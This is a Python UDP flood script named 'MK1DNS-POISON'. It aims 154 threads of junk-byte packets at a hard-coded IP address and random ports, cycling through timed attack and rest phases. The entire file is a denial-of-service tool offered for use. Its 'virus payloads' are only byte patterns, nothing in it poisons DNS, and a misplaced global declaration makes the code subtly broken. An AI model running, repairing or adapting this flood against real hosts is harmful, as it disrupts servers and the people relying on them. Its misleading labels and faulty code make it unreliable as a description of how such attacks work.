import socket
import threading
import time
import random

target = "162.0.217.103"
MIN_THREADS = 154

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Virus payloads
VIRUS_PAYLOADS = [
    b'\xDE\xAD\xBE\xEF' * 16,
    b'\x00' * 64,
    b'\xFF' * 48,
    b'\xAA\x55\xCC\x33' * 12,
    b'\x80' * 56,
    b'\x7F' * 60,
    random.randbytes(64),
]

# Cooldown system
ATTACK_CYCLE = 300    # 5 minutes attacking
COOLDOWN_TIME = 600   # 10 minutes resting
attack_active = True
cycle_start = time.time()
next_cooldown = cycle_start + ATTACK_CYCLE

# Stats
total_packets = 0
start_time = time.time()

def virus_attack(thread_id):
    global total_packets
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        # Check cooldown state
        current_time = time.time()
        
        if current_time >= next_cooldown:
            # Switch state
            global attack_active, cycle_start, next_cooldown
            if attack_active:
                # Enter cooldown
                attack_active = False
                cycle_start = current_time
                next_cooldown = current_time + COOLDOWN_TIME
                print(f"\n{YELLOW}[COOLDOWN ACTIVE] Resting for 10 minutes{RESET}")
            else:
                # Resume attack
                attack_active = True
                cycle_start = current_time
                next_cooldown = current_time + ATTACK_CYCLE
                print(f"\n{GREEN}[ATTACK RESUMED] Firing for 5 minutes{RESET}")
        
        # Only send if attack is active
        if attack_active:
            try:
                payload = random.choice(VIRUS_PAYLOADS)
                port = random.randint(1, 65535)
                
                sock.sendto(payload, (target, port))
                total_packets += 1
                
            except:
                try:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                except:
                    pass
        else:
            # Sleep during cooldown to reduce CPU
            time.sleep(0.1)

# Launch threads
print(f"{RED}MK1DNS-POISON{RESET} | Target: {target}")
print(f"{GREEN}Starting {MIN_THREADS} virus threads...{RESET}")
print(f"{CYAN}Cooldown System: 5min attack → 10min rest{RESET}")

for i in range(MIN_THREADS):
    t = threading.Thread(target=virus_attack, args=(i,))
    t.daemon = True
    t.start()

# Status display
last_display = 0
while True:
    time.sleep(1)
    
    current_time = time.time()
    elapsed_total = current_time - start_time
    
    # Update display every 5 seconds
    if current_time - last_display >= 5:
        pps = int(total_packets / elapsed_total) if elapsed_total > 0 else 0
        
        # Calculate time remaining in current state
        time_left = max(0, next_cooldown - current_time)
        minutes = int(time_left // 60)
        seconds = int(time_left % 60)
        
        if attack_active:
            state_color = GREEN
            state_text = "ATTACKING"
        else:
            state_color = YELLOW
            state_text = "COOLDOWN"
        
        print(f"{RED}MK1DNS-POISON{RESET}:{GREEN}{pps}/s{RESET} | "
              f"{state_color}{state_text} {minutes:02d}:{seconds:02d}{RESET}")
        
        last_display = current_time
    
    # Reset stats every minute
    if elapsed_total >= 60:
        total_packets = 0
        start_time = time.time()
